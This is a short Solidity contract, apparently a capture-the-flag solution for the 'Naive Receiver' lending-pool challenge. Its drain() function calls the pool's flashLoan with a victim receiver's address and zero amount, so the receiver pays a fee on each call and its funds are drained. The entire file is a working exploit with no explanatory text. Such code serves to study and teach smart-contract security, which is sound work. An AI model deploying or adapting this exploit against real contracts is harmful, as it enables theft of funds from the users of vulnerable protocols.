// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

contract NaiveReceiverAttacker {
    INaiveReceiverLenderPool public immutable pool;
    address public immutable receiver;

    constructor(address poolAddress, address _receiver) {
        pool = INaiveReceiverLenderPool(poolAddress);
        receiver = _receiver;
    }

    function drain() external {
        pool.flashLoan(receiver, 0);
    }
}

interface INaiveReceiverLenderPool {
    function flashLoan(address, uint256) external;
}
